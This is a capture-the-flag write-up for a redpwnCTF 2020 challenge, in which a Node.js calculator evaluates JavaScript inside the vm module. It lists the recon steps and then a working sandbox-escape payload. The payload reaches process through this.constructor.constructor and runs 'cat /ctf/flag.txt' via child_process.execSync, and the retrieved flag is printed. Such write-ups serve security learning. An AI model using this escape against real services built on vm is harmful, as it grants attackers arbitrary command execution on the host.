### Challenge
```
Who needs regex for sanitization when we have VMs?!?!

The flag is at /ctf/flag.txt

nc 2020.redpwnc.tf 31273
```

### Recon
* Playing with the cli with Javascript we understand that, all javascript globals seems to be allowed like here --> https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects

```
nc 2020.redpwnc.tf 31273
Welcome to my Calculator-as-a-Service (CaaS)!
This calculator lets you use the full power of Javascript for
your computations! Try `Math.log(Math.expm1(5) + 1)`
Type q to exit.

> eval(/ctf/flag.txt)
An error occurred.

> eval
function eval() { [native code] }

> parseInt
function parseInt() { [native code] }

> decodeURI
function decodeURI() { [native code] }

> parseFloat
function parseFloat() { [native code] }

> Object
function Object() { [native code] }

> Object.keys
function keys() { [native code] }

> Function
function Function() { [native code] }
```

* Taking VM as a hint --> Javascript VM seems to be one way to go --> https://nodejs.org/api/vm.html

* After doing all this I knew about I got to know the challenge had the calculator.js file that confirms the vm assumption

### Solve

* Bypassing vm --> runInNewContext with references below, (https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)
```
const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
```

* FLag
```
> let a = "welcome!";a;
welcome!

> const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```

### References
* https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
* https://github.com/patriksimek/vm2/issues/32
* https://gist.github.com/domenic/d15dfd8f06ae5d1109b0
* https://nodejs.org/api/vm.html
* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects
